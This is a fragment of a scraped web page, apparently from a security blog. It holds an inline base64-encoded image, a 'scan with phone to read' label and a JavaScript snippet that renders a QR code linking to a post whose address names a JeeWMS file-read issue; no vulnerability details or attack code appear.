OulwOpyVa4R8iUS9tHz8v1QOq6LhchPghaL+oTV7r5PUJ67rW6XvVQh3kdRIdg9aqwTixtHxA/jKi/cDmQfaPr+t+dwDYQyNTOlobHvppyxaoPPK63DuKDoLoIRx2i1foVEG5NafvoOoz+npeL+151rS7C2K88s9BfuA2kyBXvP4FtIH1yq63pM9855K6AoD6x++WiPrHrMO9bfr0wetTLMwsY/TDnEH3VD5KHoGt1P4x5fYXbQIpc8f4TWA4E5lOEud6/lNVdAc/V2w9Gf++rrxBGb2kVMNcrt49Hvfe+fg1j/1UfGH32gejA9Zv67cNey8+y+j6dugiZqj51Oczz3adf7PnOYewL4bD+G8Pew7U6Qnqt/OoQHwTVRfvKYfSZh+jywuW3rEpe8e9PYBsIZFpOVXRLkDwEzUM4BPV3hDEPj3nvL+991Qth7KkXRh3CIVi1Ffq/CyH97QcjrzV7bAOx6ML3nsBhIJApQtDt9Umqr7D75fo7V4esC0F9EK6v64CpJQLT/24Ac703gvjU+x7UIT7zHfXN8DCQmenS/t0JLP8+xKn2rUCmr66vI8QHc7QekrdeXQ7zPETXv0dIDoL2EmHU97V1DcnfbsWOYZ+egbEOwmFE6yC6vPB6QuoUPii230OcurjaY8/Dccr7Wv0d9ajLRRj7wsitm6E9zMnFlQ7zNVZ1MPfbX7ReVBfVC68npE7hg2L7GQKZNjyH/WuAsa7nO4f4u77is7upvJA+QNFpAPd3VzDHadET4tmeVi0g+5jlrydkdipv1LaBOO0zPNur9fpgfTfomWHvM/OUpq+w+KMozyys6TkY9w7hMKL1on3kYtdh7ANcn/bePuy1PSHuC45TA0x/GYH793PvFgiHoLoLySF5dQiHI3bPqoe+jpCeXbdPR32QOhix5+Xivt9hIJoufM8JfHkg++nWNeTu6F8OzPWqqVj5IXXl2Uf3P8Ot1wvpLRf1ieoijHX6OupXl8tFSD/g+hly+7DXl58Qvx7IlOVnCHM/RPfuESG6fdWfQWvOEMY19LuGXIT4Iah+hjD67V/4bQM528SVf+4EDgOpKc3iuXZHl73MdA65W1Z6r4P41SEcjqhHhHjkrtkR4oOgfhi5+hnCvA6O+mEgZ82v/N89gW0gkGnBY1xtp99l8pVfXR9kXfVn0frCXgPpCcHyVEC4fgiHoLoI0at2H+afRWu7H9IfuN5l3T7stT0hH7av/9vt/A8AAP//kh8CwQAAAAZJREFUAwDTi0HC8+tUoAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 